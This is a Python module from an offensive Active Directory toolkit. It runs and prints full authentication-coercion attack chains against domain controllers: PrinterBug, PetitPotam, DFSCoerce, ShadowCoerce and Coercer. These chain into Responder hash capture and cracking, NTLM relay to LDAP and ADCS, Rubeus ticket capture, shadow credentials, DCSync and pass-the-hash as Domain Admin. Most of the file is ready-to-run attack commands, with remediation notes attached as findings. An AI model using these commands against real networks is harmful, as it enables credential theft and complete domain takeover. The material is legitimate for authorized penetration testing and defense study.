"""
Module: Printer Bug / Coercion Attacks
Techniques: MS-RPRN (PrinterBug), PetitPotam (EfsRpc), DFSCoerce (MS-DFSNM),
            ShadowCoerce (MS-FSRVP), Coercer (all methods), Responder capture,
            NTLM relay to LDAP/LDAPS, NTLM relay to ADCS (DC cert → DA)
"""
from utils.helpers import *
from config.settings import SESSION

PETITPOTAM = "tools/PetitPotam/PetitPotam.py"

def run():
    print_banner("COERCION ATTACKS", "MS-RPRN / PetitPotam / DFSCoerce / ShadowCoerce / ADCS Relay")
    dc       = input_or_session("dc_ip",    "Target DC IP")
    dom      = input_or_session("domain",   "Domain")
    user     = input_or_session("username", "Username")
    pw       = input_or_session("password", "Password")
    attacker = prompt("Attacker listener IP")

    print(f"""
  {C}── COERCION METHODS ─────────────────────────────────────────────{RST}
  [1]  MS-RPRN PrinterBug          (SpoolSample / printerbug.py)
  [2]  PetitPotam                  (EfsRpc — authenticated / unauthenticated)
  [3]  DFSCoerce                   (MS-DFSNM — NetrDfsAddStdRoot)
  [4]  ShadowCoerce                (MS-FSRVP — VSS protocol)
  [5]  Coercer                     (all methods — scan + coerce)
  [6]  Coercibility Check          (passive scan — no exploitation)
  {C}── RELAY & CAPTURE ──────────────────────────────────────────────{RST}
  [7]  Capture NTLMv2 Hash         (Responder + trigger coercion)
  [8]  Relay → LDAP / LDAPS        (add computer / DCSync rights)
  [10] Unconstrained Delegation TGT Capture  (Rubeus monitor + coerce)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] MS-RPRN PrinterBug ────────────────────────────────────────────────
    if c == "1":
        info("Checking if Print Spooler is running on target...")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M spooler")
        print(f"""
  {C}MS-RPRN PrinterBug — force DC to authenticate to attacker:{RST}

  {Y}Python / Linux:{RST}
  python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}

  {Y}Windows binary:{RST}
  .\\MS-RPRN.exe \\\\{dc} \\\\{attacker}

  {Y}Capture TGT on unconstrained delegation host (Rubeus):{RST}
  # Terminal 1 — monitor for incoming TGTs:
  .\\Rubeus.exe monitor /interval:5 /filteruser:DC$

  # Terminal 2 — trigger coercion:
  python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}

  # Rubeus catches TGT → Pass-the-Ticket:
  .\\Rubeus.exe ptt /ticket:<base64_ticket>
  .\\Rubeus.exe s4u /ticket:<base64> /impersonateuser:Administrator /msdsspn:cifs/{dc} /ptt

  {DIM}Requires: Print Spooler service running on target DC
  Default state: ENABLED on most Windows Server versions{RST}
""")
        add_finding("PrinterBug (MS-RPRN) Coercion", "High",
                    f"DC {dc} coerced to authenticate to {attacker} via MS-RPRN SpoolSample",
                    "Disable Print Spooler on all DCs (KB5005652); monitor Event ID 316 in Microsoft-Windows-PrintService/Admin")

    # ── [2] PetitPotam ────────────────────────────────────────────────────────
    elif c == "2":
        print(f"""
  {C}PetitPotam — EfsRpc coercion:{RST}

  {Y}Unauthenticated (unpatched — pre KB5005413):{RST}
  python3 {PETITPOTAM} {attacker} {dc}

  {Y}Authenticated (post-patch fallback via other named pipes):{RST}
  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}

  {Y}Try ALL named pipes:{RST}
  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} {dc} --all

  {DIM}Named pipes tried: lsarpc / efsr / samr / lsass / netlogon{RST}

  {Y}Via Coercer (more reliable pipe selection):{RST}
  python3 Coercer.py coerce -t {dc} -l {attacker} \\
    -u '{user}' -p '{pw}' -d {dom} \\
    --filter-protocol-name ms-efsr

  {Y}Check if patched (KB5005413):{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -M petitpotam
""")
        add_finding("PetitPotam (EfsRpc) Coercion", "Critical",
                    f"EfsRpc forced DC {dc} to authenticate to {attacker}",
                    "Apply KB5005413; enable EPA on ADCS and IIS; enable Extended Protection for Authentication")

    # ── [3] DFSCoerce ─────────────────────────────────────────────────────────
    elif c == "3":
        print(f"""
  {C}DFSCoerce — MS-DFSNM coercion:{RST}

  python3 dfscoerce.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}

  {Y}Via Coercer:{RST}
  python3 Coercer.py coerce -t {dc} -l {attacker} \\
    -u '{user}' -p '{pw}' -d {dom} \\
    --filter-protocol-name ms-dfsnm

  {DIM}Uses: NetrDfsAddStdRoot / NetrDfsRemoveStdRoot via MS-DFSNM protocol
  Requires: Domain user credentials (authenticated)
  Works on: Fully patched 2022 servers (no patch available at time of release){RST}
""")
        run_cmd(f"python3 dfscoerce.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}")
        add_finding("DFSCoerce (MS-DFSNM) Coercion", "High",
                    f"MS-DFSNM triggered DC {dc} to authenticate to {attacker}",
                    "Disable DFS service if not required; restrict NetrDfsAddStdRoot; apply latest Windows updates")

    # ── [4] ShadowCoerce ──────────────────────────────────────────────────────
    elif c == "4":
        print(f"""
  {C}ShadowCoerce — MS-FSRVP (File Server VSS Protocol) coercion:{RST}

  python3 shadowcoerce.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}

  {Y}Via Coercer:{RST}
  python3 Coercer.py coerce -t {dc} -l {attacker} \\
    -u '{user}' -p '{pw}' -d {dom} \\
    --filter-protocol-name ms-fsrvp

  {DIM}Uses: IsPathSupported / IsPathShadowCopied via MS-FSRVP
  Requires: File Server VSS Agent service running
  Authenticated coercion only{RST}
""")
        run_cmd(f"python3 shadowcoerce.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}")
        add_finding("ShadowCoerce (MS-FSRVP) Coercion", "High",
                    f"MS-FSRVP triggered DC {dc} to authenticate to {attacker}",
                    "Disable File Server VSS Agent Service if not needed; apply latest Windows updates")

    # ── [5] Coercer ───────────────────────────────────────────────────────────
    elif c == "5":
        method = prompt("Mode [scan/coerce] (default=coerce)") or "coerce"
        proto  = prompt("Protocol filter [ms-rprn/ms-efsr/ms-dfsnm/ms-fsrvp/all] (default=all)") or "all"
        https  = prompt("Use HTTPS listener? [y/n] (default=n)") or "n"
        listener = f"https://{attacker}" if https == "y" else attacker

        if method == "scan":
            info("Passive scan — no exploitation, no authentication coerced")
            run_cmd(f"python3 Coercer.py scan -t {dc} -u '{user}' -p '{pw}' -d {dom}")
        else:
            if proto == "all":
                run_cmd(
                    f"python3 Coercer.py coerce "
                    f"-t {dc} -l {listener} "
                    f"-u '{user}' -p '{pw}' -d {dom}"
                )
            else:
                run_cmd(
                    f"python3 Coercer.py coerce "
                    f"-t {dc} -l {listener} "
                    f"-u '{user}' -p '{pw}' -d {dom} "
                    f"--filter-protocol-name {proto}"
                )
        add_finding("Coercer — Multi-Protocol Auth Coercion", "High",
                    f"Multiple coercion protocols tested against {dc} — auth coerced to {attacker}",
                    "Patch all coercion vectors; enforce SMB signing on all hosts; monitor unusual outbound auth from DCs")

    # ── [6] Coercibility Check ────────────────────────────────────────────────
    elif c == "6":
        info("Passive coercibility scan — checking which methods are available...")
        run_cmd(f"python3 Coercer.py scan -t {dc} -u '{user}' -p '{pw}' -d {dom}")
        info("Checking Spooler service status:")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M spooler")
        info("Checking WebDAV / WebClient service:")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M webdav")
        info("Checking PetitPotam (unauthenticated):")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M petitpotam")

    # ── [7] Capture NTLMv2 Hash ───────────────────────────────────────────────
    elif c == "7":
        iface = prompt("Network interface (e.g. eth0, tun0)")
        print(f"""
  {C}Capture NTLMv2 hash via Responder + coercion trigger:{RST}

  {Y}Terminal 1 — Start Responder:{RST}
  sudo responder -I {iface} -rdwv

  {Y}Terminal 2 — Trigger coercion (choose one):{RST}

  # PetitPotam (no creds):
  python3 {PETITPOTAM} {attacker} {dc}

  # PetitPotam (with creds):
  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}

  # PrinterBug:
  python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}

  # Coercer (all methods):
  python3 Coercer.py coerce -t {dc} -l {attacker} -u '{user}' -p '{pw}' -d {dom}

  {Y}Hash saved to:{RST}
  /usr/share/responder/logs/

  {Y}Crack NTLMv2 hash:{RST}
  hashcat -m 5600 /usr/share/responder/logs/*.txt \\
    /usr/share/wordlists/rockyou.txt --force

  {Y}Or use ntlmrelayx instead of Responder (see options [8] / [9]):{RST}
  {DIM}Relay is more powerful — direct code execution without cracking{RST}
""")

    # ── [8] Relay → LDAP / LDAPS ──────────────────────────────────────────────
    elif c == "8":
        action = prompt("Relay action [add-computer/escalate/socks] (default=add-computer)") or "add-computer"
        print(f"""
  {C}Relay coerced DC auth → LDAP / LDAPS:{RST}

  {Y}Terminal 1 — Start ntlmrelayx BEFORE triggering coercion:{RST}
""")
        if action == "add-computer":
            print(f"""
  # Add a new computer account (use for RBCD / Shadow Creds)
  impacket-ntlmrelayx \\
    -t ldap://{dc} \\
    -smb2support \\
    --add-computer EVILCOMP \\
    --computer-password 'P@ss123!'
""")
        elif action == "escalate":
            print(f"""
  # Grant DCSync rights to controlled user
  impacket-ntlmrelayx \\
    -t ldap://{dc} \\
    -smb2support \\
    --escalate-user '{user}'
""")
        elif action == "socks":
            print(f"""
  # SOCKS proxy — use with proxychains + impacket tools
  impacket-ntlmrelayx \\
    -t ldap://{dc} \\
    -smb2support \\
    --socks
""")
        print(f"""
  {Y}Terminal 2 — Trigger coercion (after relay is started):{RST}
  python3 {PETITPOTAM} {attacker} {dc}
  # or
  python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}
  # or
  python3 Coercer.py coerce -t {dc} -l {attacker} -u '{user}' -p '{pw}' -d {dom}

  {Y}If SOCKS — use proxychains to interact:{RST}
  proxychains impacket-secretsdump '{dom}/EVILCOMP$@{dc}' -no-pass
  proxychains impacket-secretsdump '{dom}/{user}@{dc}' -hashes :<nt_hash>

  {Y}If escalated — run DCSync directly:{RST}
  impacket-secretsdump {dom}/{user}:'{pw}'@{dc} -just-dc-ntlm

  {DIM}⚠ Requires: LDAP signing NOT enforced (default on most domains)
  For LDAPS: replace ldap:// with ldaps:// + requires channel binding disabled{RST}
""")
        add_finding("NTLM Relay to LDAP via Coercion", "Critical",
                    f"Coerced DC machine account auth relayed to LDAP — {action} executed on {dc}",
                    "Enable LDAP signing + channel binding; enforce SMB signing on ALL hosts; patch all coercion vectors")

    # ── [9] Relay → ADCS ──────────────────────────────────────────────────────
    elif c == "9":
        ca       = prompt("CA / ADCS server IP or FQDN")
        template = prompt("Certificate template (default=DomainController)") or "DomainController"
        print(f"""
  {C}Coercion → ADCS HTTP Relay → DC Certificate → Domain Admin:{RST}

  {Y}Terminal 1 — Start ntlmrelayx targeting ADCS web enrollment:{RST}
  impacket-ntlmrelayx \\
    -t http://{ca}/certsrv/certfnsh.asp \\
    -smb2support \\
    --adcs \\
    --template {template}

  {Y}Alternative — certipy relay (cleaner output):{RST}
  certipy relay \\
    -ca {ca} \\
    -template {template}

  {Y}Terminal 2 — Trigger coercion (after relay is started):{RST}
  python3 {PETITPOTAM} {attacker} {dc}
  # or
  python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}
  # or
  python3 Coercer.py coerce -t {dc} -l {attacker} -u '{user}' -p '{pw}' -d {dom}

  {Y}Step 3 — Authenticate with obtained DC certificate (PKINIT → NT hash):{RST}
  certipy auth \\
    -pfx dc.pfx \\
    -dc-ip {dc} \\
    -domain {dom}
  # Output: DC machine account NT hash

  {Y}Step 4 — DCSync using DC machine account hash → ALL domain hashes:{RST}
  impacket-secretsdump \\
    '{dom}/DC$@{dc}' \\
    -hashes :<nt_hash_from_step3> \\
    -just-dc-ntlm

  {Y}Step 5 — Pass-the-Hash as Domain Admin:{RST}
  impacket-psexec '{dom}/Administrator@{dc}' -hashes :<da_nt_hash>
  evil-winrm -i {dc} -u Administrator -H <da_nt_hash>
  crackmapexec smb {dc} -u Administrator -H <da_nt_hash> -d {dom}

  {R}Result: Full Domain Admin — entire domain compromised{RST}

  {DIM}Requirements:
  - ADCS web enrollment HTTP (not HTTPS with EPA) must be accessible
  - DomainController template must allow DC enrollment
  - EPA (Extended Protection for Authentication) must NOT be enabled on IIS{RST}
""")
        add_finding("Coercion → ADCS Relay → Full Domain Compromise", "Critical",
                    f"DC {dc} auth coerced → relayed to ADCS {ca} → DC certificate obtained → DCSync → Domain Admin",
                    "Enable EPA + require HTTPS on ADCS IIS enrollment; enforce channel binding; patch all coercion vectors (PetitPotam/PrinterBug/DFSCoerce)")

    # ── [10] Unconstrained Delegation TGT Capture ────────────────────────────────
    elif c == "10":
        uncon_host = prompt("Unconstrained delegation host (FQDN or IP)")
        filter_user = prompt("Filter user to capture TGT for (e.g. DC$)") or "DC$"
        print(f"""
  {NEON_CYN}Unconstrained Delegation TGT Capture via Coercion:{RST}

  {DIM}When a DC is coerced to authenticate to a host with Unconstrained Delegation,
  the DC's TGT is cached on that host → extract and impersonate the DC.
  DC machine TGT → DCSync → full domain compromise.{RST}

  ── Step 1: Find unconstrained delegation hosts ────────────────────────────
  Get-DomainComputer -Unconstrained | select cn,dnshostname
  # Or:
  Get-ADComputer -Filter {{TrustedForDelegation -eq $true}} | select Name,DNSHostName

  ── Step 2: Terminal 1 — Monitor for incoming TGTs on {uncon_host} ────────
  # Run ON the unconstrained delegation host (as admin):
  .\\Rubeus.exe monitor /interval:5 /nowrap /filteruser:{filter_user}

  ── Step 3: Terminal 2 — Trigger coercion from attacker (target = DC) ─────
  # PrinterBug (coerce DC to auth to {uncon_host}):
  python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {uncon_host}

  # PetitPotam:
  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {uncon_host} {dc}

  # Coercer (all methods):
  python3 Coercer.py coerce -t {dc} -l {uncon_host} -u '{user}' -p '{pw}' -d {dom}

  ── Step 4: Rubeus captures TGT → inject it ──────────────────────────────
  # Once Rubeus shows captured ticket (base64):
  .\\Rubeus.exe ptt /ticket:<base64_tgt>

  ── Step 5: DCSync with DC machine TGT ───────────────────────────────────
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\krbtgt"'
  # Or:
  impacket-secretsdump -k -no-pass {dom}/{filter_user.rstrip("$")}@{dc}

  {NEON_CYN}Alternative — Rubeus S4U after TGT capture: ─────────────────────{RST}
  .\\Rubeus.exe s4u /ticket:<dc_tgt_base64> /impersonateuser:Administrator \\
    /msdsspn:cifs/{dc} /ptt

  {DIM}This is one of the most reliable DA escalation paths in AD.
  Works even on fully-patched environments (delegation is a design feature).{RST}
""")
        add_finding("Unconstrained Delegation TGT Capture", "Critical",
                    f"DC TGT captured on unconstrained host {uncon_host} via coercion → DCSync possible",
                    "Remove unconstrained delegation from all non-DC hosts; monitor Rubeus monitor-style TGT requests; disable Print Spooler on DCs")

    # ── [11] Relay → Shadow Credentials ─────────────────────────────────────────
    elif c == "11":
        shadow_target = prompt("Target account for shadow credentials (e.g. DC$)")
        print(f"""
  {NEON_CYN}NTLM Relay → Shadow Credentials (msDS-KeyCredentialLink):{RST}

  {DIM}Relay coerced DC machine account auth to LDAP → add KeyCredential to target.
  Then use PKINIT to authenticate as target → UnPAC-the-Hash → NT hash.
  No password needed after successful relay.{RST}

  ── Step 1: Terminal 1 — Start ntlmrelayx with shadow-credentials ─────────
  impacket-ntlmrelayx \\
    -t ldaps://{dc} \\
    -smb2support \\
    --shadow-credentials \\
    --shadow-target '{shadow_target}'

  ── Step 2: Terminal 2 — Trigger coercion (target = host to coerce) ───────
  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} <coerce_target>
  # or
  python3 printerbug.py '{dom}/{user}:{pw}@<coerce_target>' {attacker}
  # or
  python3 Coercer.py coerce -t <coerce_target> -l {attacker} -u '{user}' -p '{pw}' -d {dom}

  ── Step 3: ntlmrelayx output — copy PFX file path + password ─────────────
  # Example output:
  # [*] Shadow credentials successfully set on 'DC$'
  # [*] Saved PFX certificate to: /tmp/dc.pfx (password: <random>)

  ── Step 4: Authenticate via PKINIT → get NT hash ────────────────────────
  certipy auth \\
    -pfx /tmp/dc.pfx \\
    -password '<pfx_password>' \\
    -username '{shadow_target}' \\
    -domain {dom} \\
    -dc-ip {dc}
  # Output: NT hash of {shadow_target}

  ── Step 5: DCSync (if target was DC$) ───────────────────────────────────
  impacket-secretsdump \\
    '{dom}/{shadow_target.rstrip("$")}@{dc}' \\
    -hashes :<nt_hash_from_step4> \\
    -just-dc-ntlm

  {NEON_CYN}Pywhisker alternative (manual shadow cred add): ─────────────────{RST}
  python3 pywhisker.py -d {dom} -u '{user}' -p '{pw}' \\
    --target '{shadow_target}' --action add --dc-ip {dc}

  {DIM}Requirement: LDAPS (not plain LDAP) OR LDAP with channel binding disabled.
  Target must support PKINIT (DCs always do).{RST}
""")
        add_finding("Relay → Shadow Credentials", "Critical",
                    f"NTLM relay to LDAPS added KeyCredential to '{shadow_target}' → NT hash extracted via PKINIT",
                    "Enable LDAP signing + channel binding (KB5008383); patch coercion vectors; monitor msDS-KeyCredentialLink modifications")

    pause()
